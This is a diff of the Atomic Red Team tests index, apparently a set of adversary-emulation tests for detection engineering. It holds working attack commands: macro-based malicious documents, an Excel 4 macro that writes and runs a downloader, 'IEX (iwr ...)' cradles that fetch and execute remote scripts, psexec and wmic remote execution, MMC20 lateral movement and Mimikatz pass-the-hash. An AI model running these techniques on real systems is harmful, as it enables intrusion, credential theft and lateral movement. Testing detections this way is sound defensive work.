           description: Maldoc application Word or Excel
           type: String
           default: Word
-        ms_office_version:
-          description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-          type: String
-          default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Test Requires MS Office to be installed and have been run previously.
-          Run -GetPrereqs to run msword and build dependant registry keys
+      - description: 'Microsoft #{ms_product} must be installed
 
 '
-        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
-          { exit 0 } else { exit 1 }
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
 
 '
-        get_prereq_command: |
-          $msword = New-Object -ComObject word.application
-          Stop-Process -Name WINWORD
       executor:
         command: |
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
-          Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
-        cleanup_command: |
-          if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
-          Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
+        cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
+
+'
         name: powershell
     - name: OSTap Payload Download
       auto_generated_guid: 3f3af983-118a-4fa1-85d3-ba4daa739d80
@@ -42453,38 +44383,32 @@ execution:
           description: Maldoc application Word or Excel
           type: String
           default: Word
-        ms_office_version:
-          description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-          type: String
-          default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Test Requires MS Office to be installed and have been run previously.
-          Run -GetPrereqs to run msword and build dependant registry keys
+      - description: 'Microsoft #{ms_product} must be installed
 
 '
-        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
-          { exit 0 } else { exit 1 }
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
 
 '
-        get_prereq_command: |
-          $msword = New-Object -ComObject word.application
-          Stop-Process -Name WINWORD
       executor:
         command: |
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
-          Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
-        cleanup_command: 'Remove-ItemProperty -Path ''HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\''
-          -Name ''AccessVBOM'' -ErrorAction Ignore
-
-'
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
     - name: OSTAP JS version
       auto_generated_guid: add560ef-20d6-4011-a937-2c340f930911
       description: |
         Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
-
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
@@ -42497,31 +44421,158 @@ execution:
           description: Maldoc application Word or Excel
           type: String
           default: Word
-        ms_office_version:
-          description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-          type: String
-          default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Test Requires MS Office to be installed and have been run previously.
-          Run -GetPrereqs to run msword and build dependant registry keys
+      - description: 'Microsoft #{ms_product} must be installed
 
 '
-        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
-          { exit 0 } else { exit 1 }
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
 
 '
-        get_prereq_command: |
-          $msword = New-Object -ComObject word.application
-          Stop-Process -Name WINWORD
       executor:
         command: |
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
-          Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
+        name: powershell
+    - name: Office launching .bat file from AppData
+      auto_generated_guid: 9215ea92-1ded-41b7-9cd6-79f9a78397aa
+      description: Microsoft Office creating then launching a .bat script from an
+        AppData directory. The .bat file launches calc.exe when opened.
+      supported_platforms:
+      - windows
+      input_arguments:
+        bat_path:
+          description: Path to malicious .bat file
+          type: String
+          default: $("$env:temp\art1204.bat")
+        ms_product:
+          description: Maldoc application Word or Excel
+          type: String
+          default: Word
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft #{ms_product} must be installed
+
+'
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
+
+'
+      executor:
+        command: |
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
+          Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
+        name: powershell
+    - name: Excel 4 Macro
+      auto_generated_guid: 4ea1fc97-8a46-4b4e-ba48-af43d2a98052
+      description: |
+        This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a "malicious"
+        VBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.
+
+        A note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If
+        you'd like to utilize the "=GET.WORKSPACE(26)" method, that many maldoc authors use, you will need to ensure that the User Name associated
+        with Excel matches that of the local system. This username can be found under Files -> Options -> Username
+      supported_platforms:
+      - windows
+      input_arguments:
+        download_url:
+          description: Download URL
+          type: String
+          default: https://live.sysinternals.com/procexp.exe
+        uname:
+          description: Username for pathing
+          type: String
+          default: "$env:Username"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft Excel must be installed
+
+'
+        prereq_command: |
+          try {
+            New-Object -COMObject "Excel.Application" | Out-Null
+            Stop-Process -Name "Excel"
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft Excel
+          manually to meet this requirement"
+
+'
+      executor:
+        command: |
+          $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
+          $fname1 = "$env:TEMP\procexp.exe"
+          if (Test-Path $fname) {
+            Remove-Item $fname
+            Remove-Item $fname1
+          }
+
+          $xlApp = New-Object -COMObject "Excel.Application"
+          $xlApp.Visible = $True
+          $xlApp.DisplayAlerts = $False
+          $xlBook = $xlApp.Workbooks.Add()
+          $sheet = $xlBook.Excel4MacroSheets.Add()
+
+          if ("#{uname}" -ne "") {
+            $sheet.Cells.Item(1,1) = "#{uname}"
+          } else {
+            $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
+          }
+
+          $sheet.Cells.Item(2,1) = "procexp.exe"
+          $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
+          $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
+          $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
+          $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"#{download_url}`"`"`")"
+          $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
+          $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
+          $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
+          $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
+          $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
+          $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
+          $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
+          $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
+          $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
+          $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
+          $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
+          $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
+          $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
+          $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
+          $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
+          $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
+          $sheet.Cells.Item(23,1) = "=HALT()"
+          $sheet.Cells.Item(1,1).Name = "runme"
+          $xlApp.Run("runme")
+          $xlApp.Quit()
+
+          [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
+          [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
+          [System.GC]::Collect()
+          [System.GC]::WaitForPendingFinalizers()
+
+          Remove-Variable xlBook
+          Remove-Variable xlApp
         cleanup_command: |
-          if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
-          Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+          Stop-Process -Name "procexp*" -ErrorAction Ignore
+          Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
+          Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
         name: powershell
   T1204.001:
     technique:
@@ -42681,7 +44732,7 @@ execution:
       executor:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe #{source_file}
-          %tmp/T1106.exe
+          %tmp%/T1106.exe
         name: command_prompt
   T1059.001:
     technique:
@@ -42814,9 +44865,9 @@ execution:
           import-module #{file_path}\SharpHound.ps1
           Invoke-BloodHound -OutputDirectory $env:Temp
           Start-Sleep 5
-        cleanup_command: |
-          Remove-Item #{file_path}\SharpHound.ps1 -Force -ErrorAction Ignore
-          Remove-Item $env:Temp\*BloodHound.zip -Force
+        cleanup_command: 'Remove-Item $env:Temp\*BloodHound.zip -Force
+
+'
         name: powershell
     - name: Run Bloodhound from Memory using Download Cradle
       auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
@@ -43066,6 +45117,140 @@ execution:
           Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
           Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
           Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+    - name: ATHPowerShellCommandLineParameter -Command parameter variations
+      auto_generated_guid: 686a9785-f99b-41d4-90df-66ed515f81d7
+      description: Executes powershell.exe with variations of the -Command parameter
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line_switch_type:
+          description: The type of supported command-line switch to use
+          type: String
+          default: Hyphen
+        command_param_variation:
+          description: The "Command" parameter variation to use
+          type: String
+          default: C
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+          -CommandParamVariation #{command_param_variation} -Execute -ErrorAction
+          Stop'
+        name: powershell
+    - name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded
+        arguments
+      auto_generated_guid: 1c0a870f-dc74-49cf-9afc-eccc45e58790
+      description: Executes powershell.exe with variations of the -Command parameter
+        with encoded arguments supplied
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line_switch_type:
+          description: The type of supported command-line switch to use
+          type: String
+          default: Hyphen
+        command_param_variation:
+          description: The "Command" parameter variation to use
+          type: String
+          default: C
+        encoded_arguments_param_variation:
+          description: The "EncodedArguments" parameter variation to use
+          type: String
+          default: EA
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+          -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation
+          #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
+        name: powershell
+    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
+      auto_generated_guid: 86a43bad-12e3-4e85-b97c-4d5cf25b95c3
+      description: Executes powershell.exe with variations of the -EncodedCommand
+        parameter
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line_switch_type:
+          description: The type of supported command-line switch to use
+          type: String
+          default: Hyphen
+        encoded_command_param_variation:
+          description: The "EncodedCommand" parameter variation to use
+          type: String
+          default: E
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+          -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute
+          -ErrorAction Stop'
+        name: powershell
+    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
+        with encoded arguments
+      auto_generated_guid: 0d181431-ddf3-4826-8055-2dbf63ae848b
+      description: Executes powershell.exe with variations of the -EncodedCommand
+        parameter with encoded arguments supplied
+      supported_platforms:
+      - windows
+      input_arguments:
+        encoded_command_param_variation:
+          description: The "EncodedCommand" parameter variation to use
+          type: String
+          default: E
+        command_line_switch_type:
+          description: The type of supported command-line switch to use
+          type: String
+          default: Hyphen
+        encoded_arguments_param_variation:
+          description: The "EncodedArguments" parameter variation to use
+          type: String
+          default: EncodedArguments
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+          -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments
+          -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute
+          -ErrorAction Stop'
+        name: powershell
   T1059.006:
     technique:
       external_references:
@@ -43509,9 +45694,9 @@ execution:
       auto_generated_guid: 873106b7-cfed-454b-8680-fa9f6400431c
       description: |
         Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
-        Will run a command on a remote host.
+        Will start a process on a remote host.
 
-        Upon successful execution, powershell will download psexec.exe and spawn calc.exe on a remote endpoint (default:localhost).
+        Upon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).
       supported_platforms:
       - windows
       input_arguments:
@@ -43519,6 +45704,14 @@ execution:
           description: Remote hostname or IP address
           type: string
           default: localhost
+        user_name:
+          description: Username
+          type: String
+          default: DOMAIN\Administrator
+        password:
+          description: Password
+          type: String
+          default: P@ssw0rd1
         psexec_exe:
           description: Path to PsExec
           type: string
@@ -43537,10 +45730,11 @@ execution:
           New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: '#{psexec_exe} \\#{remote_host} -accepteula "C:\Windows\System32\calc.exe"
+        command: '#{psexec_exe} \\#{remote_host} -u #{user_name} -p #{password} -accepteula
+          "C:\Windows\System32\calc.exe"
 
 '
-        name: powershell
+        name: command_prompt
   T1129:
     technique:
       id: attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65
@@ -43978,10 +46172,45 @@ execution:
           New-Item -ItemType Directory (Split-Path #{vbscript}) -Force | Out-Null
           Copy-Item $env:TEMP\sys_info.vbs #{vbscript} -Force
       executor:
-        command: 'cscript #{vbscript} > $env:TEMP\out.txt'
+        command: 'cscript #{vbscript} > $env:TEMP\T1059.005.out.txt'
         cleanup_command: |-
           Remove-Item $env:TEMP\sys_info.vbs -ErrorAction Ignore
           Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
+        name: powershell
+    - name: Encoded VBS code execution
+      auto_generated_guid: e8209d5f-e42d-45e6-9c2f-633ac4f1eefa
+      description: |
+        This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution
+        a message box will pop up displaying "ART T1059.005"
+
+        A note regarding this module, due to the way that this module utilizes "ScriptControl" a 64bit version of Microsoft Office is required.
+        You can validate this by opening WinWord -> File -> Account -> About Word
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The 64-bit version of Microsoft Office must be installed
+
+'
+        prereq_command: |
+          try {
+            $wdApp = New-Object -COMObject "Word.Application"
+            $path = $wdApp.Path
+            Stop-Process -Name "winword"
+            if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft Word (64-bit)
+          manually to meet this requirement"
+
+'
+      executor:
+        command: |
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
+        cleanup_command: 'Get-WmiObject win32_process | Where-Object {$_.CommandLine
+          -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
+
+'
         name: powershell
   T1059.003:
     technique:
@@ -44224,16 +46453,25 @@ execution:
           description: Ip Address
           type: String
           default: 127.0.0.1
+        user_name:
+          description: Username
+          type: String
+          default: DOMAIN\Administrator
+        password:
+          description: Password
+          type: String
+          default: P@ssw0rd1
         process_to_execute:
           description: Name or path of process to execute.
           type: String
           default: notepad.exe
       executor:
-        command: 'wmic /node:"#{node}" process call create #{process_to_execute}
+        command: 'wmic /user:#{user_name} /password:#{password} /node:"#{node}" process
+          call create #{process_to_execute}
 
 '
-        cleanup_command: 'wmic /node:"#{node}" process where name=''#{process_to_execute}''
-          delete >nul 2>&1
+        cleanup_command: 'wmic /user:#{user_name} /password:#{password} /node:"#{node}"
+          process where name=''#{process_to_execute}'' delete >nul 2>&1
 
 '
         name: command_prompt
@@ -44508,7 +46746,31 @@ lateral-movement:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1021.003
+    atomic_tests:
+    - name: PowerShell Lateral Movement using MMC20
+      auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
+      description: |
+        Powershell lateral movement using the mmc20 application com object.
+
+        Reference:
+
+        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+
+        Upon successful execution, cmd will spawn calc.exe on a remote computer.
+      supported_platforms:
+      - windows
+      input_arguments:
+        computer_name:
+          description: Name of Computer
+          type: string
+          default: localhost
+      executor:
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+          $null, $null, "7")
+
+'
+        name: powershell
   T1210:
     technique:
       created: '2018-04-18T17:59:24.739Z'
@@ -44751,10 +47013,28 @@ lateral-movement:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+        mimikatz_path:
+          description: mimikatz windows executable
+          type: Path
+          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
 
 '
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      executor:
+        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}\n"
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -45034,7 +47314,7 @@ lateral-movement:
       - Windows
       identifier: T1021.001
     atomic_tests:
-    - name: RDPto-DomainController
+    - name: RDP to DomainController
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
       description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
 
@@ -45953,100 +48233,6 @@ lateral-movement:
 '
         name: powershell
         elevation_required: true
-    - name: PowerShell Lateral Movement
-      auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
-      description: |
-        Powershell lateral movement using the mmc20 application com object.
-
-        Reference:
-
-        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
-
-        Upon successful execution, cmd will spawn calc.exe on a remote computer.
-      supported_platforms:
-      - windows
-      input_arguments:
-        computer_name:
-          description: Name of Computer
-          type: string
-          default: computer1
-      executor:
-        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
-          $null, $null, "7")
-
-'
-        name: powershell
-    - name: WMIC Process Call Create
-      auto_generated_guid: 5cd59c3b-1375-4edf-9bac-5851c9915fca
-      description: |
-        Utilize WMIC to start remote process.
-
-        Upon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_name:
-          description: Username
-          type: String
-          default: DOMAIN\Administrator
-        password:
-          description: Password
-          type: String
-          default: P@ssw0rd1
-        computer_name:
-          description: Target Computer Name
-          type: String
-          default: Target
-      executor:
-        command: 'wmic /user:#{user_name} /password:#{password} /node:#{computer_name}
-          process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\"
-          /t REG_SZ /d \"cmd.exe\" /f"
-
-'
-        name: command_prompt
-    - name: Psexec
-      auto_generated_guid: 9bab84a1-08fd-4245-b681-e62c78283002
-      description: |
-        Utilize psexec to start remote process.
-
-        Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_name:
-          description: Username
-          type: String
-          default: DOMAIN\Administrator
-        psexec_exe:
-          description: Path to PsExec
-          type: string
-          default: C:\PSTools\PsExec.exe
-        password:
-          description: Password
-          type: String
-          default: P@ssw0rd1
-        computer_name:
-          description: Target Computer Name
-          type: String
-          default: localhost
-      dependencies:
-      - description: 'PsExec tool from Sysinternals must exist on disk at specified
-          location (#{psexec_exe})
-
-'
-        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
-
-'
-        get_prereq_command: |
-          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
-          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
-          New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
-          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
-      executor:
-        command: "#{psexec_exe} \\\\#{computer_name} -accepteula -u #{user_name} -p
-          #{password} -s cmd.exe\n"
-        name: command_prompt
     - name: Invoke-Command
       auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
       description: |
@@ -47589,6 +49775,45 @@ command-and-control:
           del C:\\svchost.exe >nul 2>&1
         name: command_prompt
         elevation_required: true
+    - name: Download a File with Windows Defender MpCmdRun.exe
+      auto_generated_guid: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
+      description: |
+        Uses the Windows Defender to download a file from the internet (must have version 4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9 installed).
+        The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
+        By default, the test downloads the Atomic Red Team license file to the temp directory.
+
+        More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to download
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Location to save downloaded file
+          type: path
+          default: "%temp%\\Atomic-license.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Must have one of these Windows Defender versions installed:
+          4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9'
+        prereq_command: |
+          $retVal = 1
+          foreach ($version in @("4.18.2007.8-0","4.18.2007.9","4.18.2009.9")){
+            if (Test-Path "$env:ProgramData\Microsoft\Windows Defender\Platform\$version") { $retVal =  0}
+          }
+          exit $retVal
+        get_prereq_command: Write-Host "Windows Defender verion 4.18.2007.8-0, 4.18.2007.9,
+          or 4.18.2009.9 must be installed manually"
+      executor:
+        command: |
+          cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
+          MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
+        cleanup_command: |-
+          del #{local_path} >nul 2>&1
+          del %temp%\MpCmdRun.log >nul 2>&1
+        name: command_prompt
   T1090.001:
     technique:
       external_references:
@@ -49755,6 +51980,16 @@ collection:
           echo Get-Process | clip
           Get-Clipboard | iex
         name: powershell
+    - name: Execute commands from clipboard
+      auto_generated_guid: 1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff
+      description: Echo a command to clipboard and execute it
+      supported_platforms:
+      - macos
+      executor:
+        command: |-
+          echo ifconfig | pbcopy
+          $(pbpaste)
+        name: bash
   T1213.001:
     technique:
       external_references:
@@ -51228,9 +53463,10 @@ collection:
 
 '
         name: bash
-    - name: Import
